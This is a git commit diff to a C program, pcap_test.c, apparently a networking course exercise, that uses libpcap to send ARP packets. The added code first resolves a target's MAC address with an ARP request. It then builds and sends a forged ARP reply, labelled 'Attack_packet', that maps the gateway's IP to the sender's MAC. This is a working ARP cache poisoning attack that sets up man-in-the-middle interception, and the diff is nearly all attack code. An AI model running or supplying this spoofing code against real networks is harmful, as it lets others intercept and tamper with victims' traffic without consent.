826163cf365de1abde35d026f524666719b6c040
NamGungYeon <ska02@yonsei.ac.kr>
2017-07-31 13:27:29 -0400

    Success(1)

--- pcap_test.c
+++ pcap_test.c
@@ -35,7 +35,9 @@ int main(int argc, char *argv[])
 		bpf_u_int32 net;		/* Our IP */
 		struct pcap_pkthdr *header;	/* The header that pcap gives us */
 		u_char packet[1000];		/* The actual packet */
-			int i;
+		u_char Attack_packet[1000];		/* The actual packet */
+		const u_char *p;		
+		int i;
 		uint8_t src_ip[4], src_mac[6], dst_mac[6], ether_frame[IP_MAXPACKET];
 		uint8_t dst_ip[4];
 		uint8_t gate_ip[4];
@@ -56,6 +58,7 @@ printf("dst_ip : %s", argv[2]);*/
 
 		s_getMacAddress(argv[1], src_mac);	 	
 		s_getIpAddress(argv[1], src_ip);
+		sscanf(argv[3], "%d.%d.%d.%d", &gate_ip[0],&gate_ip[1],&gate_ip[2],&gate_ip[3]);
 		sscanf(argv[2], "%d.%d.%d.%d", &dst_ip[0],&dst_ip[1],&dst_ip[2],&dst_ip[3]);
 		/* Define the device */
 		dev = pcap_lookupdev(errbuf);
@@ -75,20 +78,13 @@ printf("dst_ip : %s", argv[2]);*/
 			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
 			return(2);
 		}
-		/* Compile and apply the filter */
-		if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-			fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-			return(2);
-		}
-		if (pcap_setfilter(handle, &fp) == -1) {
-			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
-			return(2);
-		}
 		memset(packet, 0, sizeof(packet));
 		struct ether_header* ehP = (struct ether_header *)packet;
 		
 		ehP->ether_type = htons(ETHERTYPE_ARP);
-
+		for(i=0; i<4; i++)
+			printf("%d.", gate_ip[i]);
+		printf("\n");
 		for(i=0; i<6; i++){
 			ehP->ether_dhost[i]=0xff;
 			arphdr.target_mac[i]=0x00;
@@ -97,11 +93,6 @@ printf("dst_ip : %s", argv[2]);*/
 			ehP->ether_shost[i]=src_mac[i];
 			arphdr.sender_mac[i]=src_mac[i];
 		}
-
-		memcpy(packet, ehP, sizeof(ehP));
-
-
-		
 		arphdr.htype = htons(1);
 		arphdr.ptype = htons(ETH_P_IP);
 		arphdr.hlen=6;
@@ -112,32 +103,87 @@ printf("dst_ip : %s", argv[2]);*/
 			arphdr.target_ip[i]=dst_ip[i];
 		}
 
-	 	/*arphdr.sender_mac[6];
-		arphdr.sender_ip[4];
-		arphdr.target_mac[6];
-		arphdr.target_ip[4];*/
-
+		memcpy(packet, ehP, sizeof(ehP));		
 		memcpy(packet+14, &arphdr, sizeof(arphdr));
-	
- 		for(i=0; i<50; i++)
-			printf("%02x ", *(packet+i));
-	if(pcap_sendpacket(handle,packet, 100)!=0)
-	{
-		printf("error");
-	}
+		
+		if(pcap_sendpacket(handle,packet, 42)!=0)
+			{
+				printf("error");
+			}
+		while((Res=pcap_next_ex(handle, &header, &p))>=0)
+		{
+			if(Res==0)
+				continue;
+			printf("A");
+			
+			struct ether_header* eh = (struct ether_header *)p;
+			if(eh->ether_type==htons(ETHERTYPE_ARP)) printf("AB");
+			for(i=0; i<6; i++)
+				dst_mac[i]=eh->ether_shost[i];
+			break;
+			
+		}
 
-		while((Res = pcap_next_ex(handle, &header, &packet))>=0){
+		for(i=0; i<6; i++)
+			printf("%02x:", dst_mac[i]);
+		pcap_close(handle);
+		////////////////////////////////////////
+dev = pcap_lookupdev(errbuf);
+		if (dev == NULL) {
+			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
+			return(2);
+		}
+		/* Find the properties for the device */
+		if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
+			fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+			net = 0;
+			mask = 0;
+		}
+		/* Open the session in promiscuous mode */
+		handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+		if (handle == NULL) {
+			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+			return(2);
+		}
+		memset(packet, 0, sizeof(packet));
+		arp_hdr Attack_arphdr ;
 		
-		cnt++;
-		printf("\n%03d===============================\n",cnt);
+		struct ether_header* Attack_ehP = (struct ether_header *)Attack_packet;
 		
-		if((check((void*)packet))<0||(Res==0))
-			continue;/*
-		print_ip((void*)(packet+sizeof(struct ether_header)));
-		print_eht((void*)packet);
-		print_tcp((void*)(packet+sizeof(struct ether_header)+sizeof(struct iphdr)));
-		print_data((void*)packet);*/
-}
+		Attack_ehP->ether_type = htons(ETHERTYPE_ARP);
+		
+		for(i=0; i<6; i++){
+			Attack_ehP->ether_dhost[i]=dst_mac[i];
+			Attack_arphdr.target_mac[i]=dst_mac[i];
+			printf("%02x:", Attack_ehP->ether_dhost[i]);
+		}
+		for(i=0; i<6; i++){
+			Attack_ehP->ether_shost[i]=src_mac[i];
+			Attack_arphdr.sender_mac[i]=src_mac[i];
+		}
+		Attack_arphdr.htype = htons(1);
+		Attack_arphdr.ptype = htons(ETH_P_IP);
+		Attack_arphdr.hlen=6;
+		Attack_arphdr.plen=4;
+		Attack_arphdr.opcode = htons(ARP_REPLY);
+		for(i=0; i<4; i++){
+			Attack_arphdr.sender_ip[i]=gate_ip[i];//
+			Attack_arphdr.target_ip[i]=dst_ip[i];
+			printf("%d.", Attack_arphdr.sender_ip[i]);
+		}
+
+		memcpy(Attack_packet, Attack_ehP, sizeof(Attack_ehP));		
+		memcpy(Attack_packet+14, &Attack_arphdr, sizeof(Attack_arphdr));
+		
+		if(pcap_sendpacket(handle,Attack_packet, 42)!=0)
+			{
+				printf("error");
+			}
+		else
+			printf("clear\n\n");
+
+		for(i=0; i<42; i++)
+			printf("%02x ", Attack_packet[i]);
 		pcap_close(handle);
 		return(0);
 	 }
